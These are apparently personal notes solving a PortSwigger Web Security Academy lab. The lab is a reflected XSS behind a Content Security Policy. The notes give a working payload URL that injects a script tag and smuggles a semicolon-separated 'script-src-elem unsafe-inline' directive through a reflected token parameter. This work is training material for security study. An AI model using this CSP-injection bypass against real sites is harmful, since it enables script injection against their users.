# Reflected XSS protected by CSP, with CSP bypass

[link](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

> the Content Security Policy (CSP) is a browser security layer only allow scripts from trusted sources, but with `script-src-elem 'unsafe-inline'` it can be bypassed

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

url decode ->

```
https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

- the `script-src-elem 'unsafe-inline'` lets the `<script>alert(1)</script>` to run, and the `&token=;` most importantly the `;` because CSP uses semicolons as a syntax separator between rules ->

> procedure:

original `Content-Security-Policy: script-src 'self'; <token>`

add `&token=;script-src-elem 'unsafe-inline'` ->

`Content-Security-Policy: script-src 'self'; script-src-elem 'unsafe-inline'`

it will insert the `script-src-elem 'unsafe-inline'` after the original content
